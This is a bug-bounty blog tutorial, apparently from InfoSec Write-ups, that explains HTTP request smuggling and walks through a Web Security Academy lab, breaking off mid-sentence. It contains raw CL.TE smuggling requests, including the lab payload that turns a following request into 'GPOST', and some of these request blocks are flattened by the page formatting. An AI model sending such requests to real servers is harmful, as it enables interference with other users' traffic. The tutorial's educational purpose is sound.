---
title: HTTP request smuggling Explained and Exploited Part 0x1
url: https://infosecwriteups.com/http-request-smuggling-explained-and-exploited-part-0x1-89ce2956534f?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2022-10-18
fetch_date: 2025-10-03T20:06:31.859729
---

# HTTP request smuggling Explained and Exploited Part 0x1

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F89ce2956534f&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fhttp-request-smuggling-explained-and-exploited-part-0x1-89ce2956534f&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fhttp-request-smuggling-explained-and-exploited-part-0x1-89ce2956534f&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-89ce2956534f---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-89ce2956534f---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow publication

# HTTP request smuggling Explained and Exploited Part 0x1

[![Hashar Mujahid](https://miro.medium.com/v2/da:true/resize:fill:64:64/1*eIN8F1x85V9OMBf50NuoLg.gif)](https://hasharmujahid.medium.com/?source=post_page---byline--89ce2956534f---------------------------------------)

[Hashar Mujahid](https://hasharmujahid.medium.com/?source=post_page---byline--89ce2956534f---------------------------------------)

6 min read

·

Oct 16, 2022

--

4

Listen

Share

Hi! My name is Hashar Mujahid and today we will sneak a peek into Request Smuggling Vulnerabilities.

Press enter or click to view image in full size

![]()

So let’s look into what HTTP request smuggling is!

## What is HTTP request smuggling?

HTTP request smuggling is an exploitation technique in which a malicious request is inserted inside an original request, which is then processed by the backend server. In this attack, the malicious request is smuggled and processed.

```
Content-Length and Transfer-Encoding
```

Headers play an important role in successful HTTP request smuggling attacks.

## What happens in an HTTP request smuggling attack?

When the front end of the application sends a request to the backend, it sends multiple parallel requests from other users at the same time, and all of these requests are sent over the same backend network.

Press enter or click to view image in full size

![]()

Multiple users , request over the same backend network and the colors shows the boundaries

So it is crucial that both the front end and the back end know where one request ends and another one begins. Otherwise, an attacker might be able to send an ambiguous request that gets interpreted differently by the front-end and back-end systems:

Press enter or click to view image in full size

![]()

As we can see in the above image, the attacker sends an ambiguous request which is wrongly interpreted by the backend, and the request becomes part of the other user’s request.

## How do HTTP request smuggling vulnerabilities arise?

The HTTP protocol provides 2 headers to represent the end of the HTTP request

> Content-Length
>
> Transfer-Encoding

### **Content-Length:**

The content length specifies the length of the request in bytes.

**for example:**

`Content-Length: 3421312`

### **Transfer-Encoding:**

This header specifies that the message body uses chunked encoding. The chunk size is represented in hexadecimal bytes. The message is terminated if the chunk size is 0 bytes.

```
Transfer-Encoding: chunked
```

We mostly see this header in server response due to this some servers don't support this header as a client request.

If the front-end and back-end servers behave differently in relation to the (possibly obfuscated) `Transfer-Encoding` header, then they might disagree about the boundaries between successive requests, leading to request smuggling vulnerabilities.

### **EXPLOITATION:**

HTTP smuggling attack involves placing both `Content-Length` and `Transfer-Encoding` in the same request so that the front-end and back-end servers process the request differently.

## Types Of HTTP Smuggling Attacks:

* **CL-TE:** Front-end uses `Content-Length` and backend uses `Transfer-Encoding` .
* **TE.CL:** Front-end uses `Tranfer-Encoding` and backend uses `Content-Length` .
* **TE.TE:** The Transfer-Encoding header is supported by both the front-end and back-end servers, but one of the servers can be convinced not to process it by obfuscating the header in some way.

## CL.TE vulnerabilities:

Here, the front-end server uses the `Content-Length` header and the back-end server uses the `Transfer-Encoding` header. We can perform a simple HTTP request smuggling attack as follows:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked  0

SMUGGLED
```

## LAB: HTTP request smuggling, basic CL.TE vulnerability

This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding. The front-end server rejects requests that aren’t using the GET or POST method.

To solve the lab, smuggle a request to the back-end server so that the next request processed by the back-end server appears to use the method `GPOST`.

Access the lab:

Press enter or click to view image in full size

![]()

Change the request method to POST.

```
POST / HTTP/1.1
Host: 0a5c005b031de1e4c0ef4924003b00cb.web-security-academy.net
Cookie: session=HrbfSiDceLLxPD6b5u1w47m0v9R4xY3n
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
ADD Transfer-Encoding:
```

and modify the request.

```
POST / HTTP/1.1
Host: 0a5c005b031de1e4c0ef4924003b00cb.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 8
Transfer-Encoding: chunked0G
```

Send this request 2 times the first response should be 200 ok and the second response should be

Press enter or click to view image in full size

![]()

We can see the server was unable to recognize the method but how we send the POST method is why the response shows GPOST.

It is because due to our header manipulation the server got confused between the content length and the transfer encoding and couldn't determine the end of the first request we send the data left behind was appended to the next request which made the POST to GPOST.

If we send the L in the post data of the first request we would get an LPOST error in the next request’s response.

Press enter or clic...